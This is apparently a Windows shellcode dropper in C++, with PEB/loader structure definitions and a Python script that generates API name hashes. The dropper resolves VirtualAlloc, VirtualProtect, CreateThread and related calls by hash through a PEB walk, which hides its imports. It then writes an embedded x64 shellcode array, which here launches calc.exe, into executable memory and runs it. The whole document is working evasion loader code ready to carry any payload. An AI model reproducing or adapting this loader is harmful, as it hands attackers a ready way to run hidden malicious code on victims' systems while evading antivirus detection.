# pestructs.h
```c
#pragma once

#include <windows.h>

//https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html#l00063
struct PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
};
//https://processhacker.sourceforge.io/doc/ntpebteb_8h_source.html#l00008
struct PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN SpareBits : 1;
		};
	};
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PEB_LDR_DATA* Ldr;
	//...
};

struct UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWCH Buffer;
};

//https://processhacker.sourceforge.io/doc/ntldr_8h_source.html#l00102
struct LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	//...
};
```

# dropper.cpp
```c
#include "pestructs.h"

constexpr unsigned int hash(const char* string)
{
	unsigned int hash = 0x86735296;
	unsigned int i = 0;
	while (string[i] != 0)
	{
		int tmp = string[i];
		if (tmp >= 65 && tmp <= 92)
		{
			tmp = tmp + 32;
		}
		hash ^= tmp * i;
		hash <<= 1;
		i++;
	}
	return hash;
}


#define TOSTRING( x ) #x
#define CONCAT( X, Y ) X##Y

#define INITDLL( DLL, VAL ) constexpr int CONCAT( hash, DLL ) = hash( VAL );
#define INITFUNC( FUNC, RETTYPE, ...) constexpr int CONCAT( hash, FUNC ) = hash( TOSTRING( FUNC ) );\
										using CONCAT( type, FUNC ) = RETTYPE( WINAPI* )( __VA_ARGS__ );

#define API( DLL, FUNC ) ( ( CONCAT( type, FUNC ))GetByHash( CONCAT( hash, DLL ) ,CONCAT( hash, FUNC ) ) )

INITDLL(KERNEL32, "KERNEL32.DLL")
INITDLL(NTDLL, "NTDLL.DLL")

INITFUNC(VirtualAlloc, LPVOID, LPVOID, SIZE_T, DWORD, DWORD);
INITFUNC(RtlMoveMemory , VOID,VOID UNALIGNED* , VOID UNALIGNED* , SIZE_T );
INITFUNC(VirtualProtect , BOOL,LPVOID , SIZE_T , DWORD , PDWORD );
INITFUNC(CreateThread , HANDLE,LPSECURITY_ATTRIBUTES , SIZE_T , LPTHREAD_START_ROUTINE , __drv_aliasesMem LPVOID , DWORD , LPDWORD );
INITFUNC(WaitForSingleObject , DWORD,HANDLE , DWORD );


FARPROC WINAPI GetByHash(unsigned int moduleHash, unsigned int functionHash)
{
#ifdef _M_IX86
	PEB* ProcEnvBlk = (PEB*)__readfsdword(0x30);
#else
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
#endif

	LIST_ENTRY* ModuleList = &ProcEnvBlk->Ldr->InMemoryOrderModuleList;

	for (LIST_ENTRY* pListEntry = ModuleList->Flink; pListEntry != ModuleList; pListEntry = pListEntry->Flink)
	{
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		char result[256]{}; int i = 0; do { result[i] = pEntry->BaseDllName.Buffer[i]; } while (result[i++] != 0);

		if (hash(result) == moduleHash)
		{
			char* pBaseAddr = (char*)(HMODULE)pEntry->DllBase;

			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
			IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
			IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
			IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
			IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);

			DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
			DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
			WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

			void* pProcAddress = NULL;

			for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++)
			{
				char* sTmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];

				if (hash(sTmpFuncName) == functionHash)
				{
					pProcAddress = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
					break;
				}
			}
			return (FARPROC)pProcAddress;
		}
	}

	return NULL;
}

unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";
unsigned int payloadSize = sizeof(payload);

int main()
{
	void* allocatedMemory = API(KERNEL32, VirtualAlloc)(0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	API(NTDLL, RtlMoveMemory)(allocatedMemory, payload, payloadSize);

	DWORD oldProtect = 0;
	API(KERNEL32, VirtualProtect)(allocatedMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

	HANDLE thread = API(KERNEL32, CreateThread)(0, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, 0, 0, 0);

	API(KERNEL32, WaitForSingleObject)(thread, INFINITE);

	return 0;
}
```

# hashing algo in python
```python
def hash(api):
    api = api.lower()
    result = 0x86735296
    for i in range(len(api)):
        result ^= ord(api[i]) * i
        result = result << 1
    return result % 0x100000000

strs = "kernel32.dll;ntdll.dll;VirtualAlloc;RtlMoveMemory;VirtualProtect;CreateThread;WaitForSingleObject"
for s in strs.split(";"):
    print("#define", s.upper().replace(".", ""), hash(s))
```